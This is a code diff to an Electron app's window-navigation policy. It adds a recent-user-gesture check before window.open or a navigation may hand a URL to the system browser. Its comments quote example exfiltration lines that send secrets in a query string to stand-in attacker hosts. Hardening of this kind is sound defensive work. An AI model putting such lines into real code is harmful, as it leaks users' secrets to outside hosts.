@@ -128,6 +128,62 @@ function spaWebPreferences() {
   };
 }
 
+// ─── BEGIN SPA-WINDOW-GESTURE (policy; unit-testable via source extraction) ──
+//
+// ⚠ THE OS OPENER IS NOT A FREE FUNCTION THE RENDERER MAY CALL (added 2026-10-11, release
+// review). The #3031 hand-off below bounded `window.open` by SCHEME alone, so a SCRIPT — not a
+// person — could call `window.open('https://attacker.example/?' + secrets)` and reach the user's
+// real browser carrying an arbitrary query string. That is an OUTBOUND channel out of a document
+// whose CSP is `default-src 'none'` with no `connect-src` at all, and it is the same hole
+// `avatar-policy.js` still cites as the reason its own gate stays HOST-based. The mitigations
+// that make the precondition hard to reach (`script-src 'self'`, no `dangerouslySetInnerHTML`
+// on the markdown path) are OTHER modules' invariants; the bound belongs here.
+//
+// So the hand-off asks TWO questions, and `main/external-url.js` stays the ONE allowlist:
+//   1. did a PERSON just act in this window?   (here)
+//   2. is the scheme one a link may use?       (external-url.js, shared with `dopl:open-external`)
+//
+// 5 seconds is Chromium's own transient-user-activation window, deliberately: a click or a
+// keypress authorizes the open that follows it and nothing later. `mouseMove`, `mouseEnter`,
+// `mouseWheel` and scroll gestures are NOT activation — a pointer crossing a transcript is not
+// consent to open a browser — so the set is positive and short.
+const GESTURE_WINDOW_MS = 5000;
+const ACTIVATING_INPUT = Object.freeze([
+  'mouseDown', 'mouseUp', 'keyDown', 'rawKeyDown', 'keyUp', 'char',
+  'touchStart', 'touchEnd', 'gestureTap',
+]);
+function isActivatingInput(type) {
+  return ACTIVATING_INPUT.includes(String(type == null ? '' : type));
+}
+// A gesture we never saw, one from the future (a clock step) and one older than the window are
+// all "no". Fails CLOSED on anything non-finite rather than treating NaN arithmetic as fresh.
+function gestureIsFresh(lastAt, now) {
+  if (!Number.isFinite(lastAt) || !Number.isFinite(now)) return false;
+  const age = now - lastAt;
+  return age >= 0 && age <= GESTURE_WINDOW_MS;
+}
+// ─── END SPA-WINDOW-GESTURE ──────────────────────────────────────────────────
+
+// The last activating input per webContents. A WeakMap, so a closed window's entry goes with it
+// and nothing here keeps a destroyed webContents alive.
+const lastGestureAt = new WeakMap();
+
+// Armed by `policeNavigation`, so a window that gets the hand-off always gets the gesture source
+// too — the two cannot be wired separately and drift.
+function armGestureTracking(wc) {
+  if (!wc || typeof wc.on !== 'function') return;
+  wc.on('input-event', (_event, input) => {
+    if (isActivatingInput(input && input.type)) lastGestureAt.set(wc, Date.now());
+  });
+}
+
+// ⚠ NO webContents => NO OPEN. A caller that cannot say which window acted cannot prove a person
+// did, and the refusal costs nothing: every real caller has one.
+function hasRecentUserGesture(wc) {
+  if (!wc) return false;
+  return gestureIsFresh(lastGestureAt.get(wc), Date.now());
+}
+
 // REFUSING A NAVIGATION IS HALF AN ANSWER; THE OTHER HALF IS THE BROWSER.
 //
 // ⚠ THIS IS THE FIX FOR #3031 — "links across the app don't open" (2026-10-10). The refusals
@@ -144,7 +200,15 @@ function spaWebPreferences() {
 // this window. Scheme policy is `main/external-url.js` (http/https/mailto; `file:`,
 // `javascript:`, `data:` and the rest stay refused), shared with `dopl:open-external` so the
 // two cannot drift.
-function handOffExternal(url, why) {
+//
+// ⚠ TWO GATES SINCE 2026-10-11, and `wc` is not optional (see SPA-WINDOW-GESTURE above). The
+// gesture is asked FIRST so a scriptable URL never even reaches the scheme test's log line.
+function handOffExternal(url, why, wc) {
+  if (!hasRecentUserGesture(wc)) {
+    // ⚠ The HOST, never the URL — a scripted open's query string is the payload.
+    diag(`spa-window: ${why} refused, no user gesture —`, externalUrl.externalUrlHost(url));
+    return false;
+  }
   if (!externalUrl.isOpenableExternalUrl(url)) {
     // ⚠ The HOST, never the URL — a blocked navigation's query string is untrusted content.
     diag(`spa-window: ${why} refused, not openable —`, externalUrl.externalUrlHost(url));
@@ -164,17 +228,22 @@ function handOffExternal(url, why) {
 // freely inside a window this locks down — and why a pop-out can be LANDED on a route by
 // loading the index with a hash rather than by being handed a URL.
 function policeNavigation(win) {
+  // The gesture source for the hand-off's first gate. Armed before the handlers that read it.
+  armGestureTracking(win.webContents);
   // `target="_blank"` and `window.open` arrive here. The window is still DENIED — what is new
-  // is that the URL it wanted is handed to the real browser instead of dropped.
+  // is that the URL it wanted is handed to the real browser instead of dropped, and only when a
+  // person just acted (`HandlerDetails` carries no activation flag, so the window tracks input).
   win.webContents.setWindowOpenHandler((details) => {
-    handOffExternal(details && details.url, 'window.open');
+    handOffExternal(details && details.url, 'window.open', win.webContents);
     return { action: 'deny' };
   });
   const indexHref = require('node:url').pathToFileURL(INDEX_HTML).href;
   const police = (event, url) => {
     if (isAllowedNavigation(url, devUrl(), indexHref)) return;
     event.preventDefault();
-    handOffExternal(url, 'navigation');
+    // ⚠ GATED THE SAME WAY, on purpose. `location.href = 'https://evil/?' + secrets` is the
+    // same exfiltration leg as a scripted `window.open`, and it arrives here instead.
+    handOffExternal(url, 'navigation', win.webContents);
   };
   win.webContents.on('will-navigate', police);
   win.webContents.on('will-redirect', police);
@@ -186,6 +255,14 @@ function policeNavigation(win) {
     // `will-navigate` and `will-frame-navigate` for one main-frame navigation, so handing off
     // in both opens the destination TWICE — two browser tabs per clicked link. `will-navigate`
     // above owns the hand-off; this listener stays what it has always been, the frame guard.
+    //
+    // ⚠ AND IT RE-ASKS THE PREDICATE ON PURPOSE (release review 2026-10-11 raised this as a
+    // redundancy; KEPT). `police` answers the same question for the same navigation, so on the
+    // ordinary path this call's answer is already known — but the two events are emitted
+    // independently and `will-navigate` is documented not to fire for every navigation
+    // `will-frame-navigate` sees. Deleting the second evaluation trades a free URL parse for a
+    // leg that would then be refused by nothing, which is the wrong side of that trade. The
+    // duplication is the belt; it is not leftover.
     if (!isAllowedNavigation(event.url, devUrl(), indexHref)) event.preventDefault();
   });
   return win;
@@ -233,6 +310,11 @@ module.exports = {
   spaWebPreferences,
   policeNavigation,
   handOffExternal,
+  armGestureTracking,
+  hasRecentUserGesture,
+  isActivatingInput,
+  gestureIsFresh,
+  GESTURE_WINDOW_MS,
   devUrl,
   INDEX_HTML,
 };
